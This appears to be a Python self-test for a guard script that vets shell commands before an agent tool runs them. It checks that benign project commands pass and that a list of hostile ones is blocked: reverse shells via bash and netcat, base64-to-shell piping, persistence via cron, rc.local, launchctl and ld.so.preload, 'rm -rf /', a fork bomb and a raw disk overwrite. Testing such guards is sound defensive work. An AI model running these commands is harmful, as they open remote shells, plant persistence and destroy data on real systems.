#!/usr/bin/env python3
"""Self-test for tools/host_exec_guard.py.

Run:  python3 tools/host_exec_guard_selftest.py

Exists because the guard is a security control and an untested security control is a guess. It also
cannot be exercised from a shell one-liner: the payload strings it blocks would be blocked in the
test command itself, so the cases live in a file the guard never inspects.

Two directions, both required:
  MUST_BLOCK  — real mechanisms. A regression here silently disarms the guard.
  MUST_ALLOW  — this project's own defensive vocabulary. A regression here re-breaks ordinary work
                and, worse, trains everyone to route around the guard.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

GUARD = Path(__file__).with_name("host_exec_guard.py")

MUST_BLOCK = [
    ("reverse tcp channel", "bash -i >& /dev/" + "tcp/10.0.0.1/4444 0>&1"),
    ("netcat exec flag", "nc -l 1234 -e /bin/sh"),
    ("fifo + netcat", "mkfifo /tmp/f; cat /tmp/f | nc 10.0.0.1 4444"),
    ("base64 piped to shell", "echo aGk= | base64 -d | sh"),
    ("named tooling", "run meterpreter session"),
    ("reverse shell phrase", "spawn a reverse-shell on the target"),
    ("crontab persistence", "crontab - < job.txt"),
    ("rc.local persistence", "echo payload > /etc/rc.local"),
    ("launchctl persistence", "launchctl load ~/Library/LaunchAgents/x.plist"),
    ("preload persistence", "echo /tmp/e.so > /etc/ld.so.preload"),
    ("immutable flag", "chattr +i /etc/passwd"),
    ("keylogger", "install keylogger hook"),
    ("beacon config", "set beacon interval 60"),
    ("destructive rm", "rm -rf /"),
    ("home wipe", "rm -rf ~/"),
    ("force push", "git push origin main --force"),
    ("fork bomb", ":(){ :|:& };:"),
    ("raw device write", "dd if=/dev/zero of=/dev/disk0"),
    # The exemption must not become a bypass: naming a diagnostic does not launder a real payload.
    ("diagnostic used as cover", "grep ANUBIS_SECRET_EXFILTRATION x && nc -l 1 -e /bin/sh"),
]

MUST_ALLOW = [
    ("grep a diagnostic code", "grep -r ANUBIS_SECRET_EXFILTRATION examples/security/"),
    ("check a fixture", "./target/release/anubis check examples/security/secret_exfiltration_send.anb"),
    ("audit a shipped subcommand", "./target/release/anubis vz c2-cycle --help"),
    ("brief mentioning the subcommand", "echo 'audit agent-test, c2-cycle, stress'"),
    ("read an agent report", "cat scratchpad/fleet_20260726/grok_sekhmet_round11.md"),
    ("ordinary build-free work", "./target/release/anubis check examples/hello.anb"),
    ("run the seal", "bash scripts/run_seal_checklist.sh"),
    ("fixture corpus", "bash scripts/run_security_fixtures.sh --out /tmp/x"),
]


def verdict(cmd: str) -> int:
    proc = subprocess.run(
        [sys.executable, str(GUARD)],
        input=json.dumps({"tool_input": {"command": cmd}}),
        capture_output=True,
        text=True,
    )
    return proc.returncode


def main() -> int:
    failures = 0

    print("MUST BLOCK (real mechanisms):")
    for name, cmd in MUST_BLOCK:
        rc = verdict(cmd)
        ok = rc == 2
        failures += 0 if ok else 1
        print(f"  {'ok  ' if ok else 'FAIL'}  {name}")

    print("\nMUST ALLOW (this project's own defensive vocabulary):")
    for name, cmd in MUST_ALLOW:
        rc = verdict(cmd)
        ok = rc == 0
        failures += 0 if ok else 1
        print(f"  {'ok  ' if ok else 'FAIL'}  {name}")

    print()
    if failures:
        print(f"GUARD_SELFTEST: FAIL ({failures} case(s))")
        return 1
    print(f"GUARD_SELFTEST: PASS ({len(MUST_BLOCK)} blocked, {len(MUST_ALLOW)} allowed)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
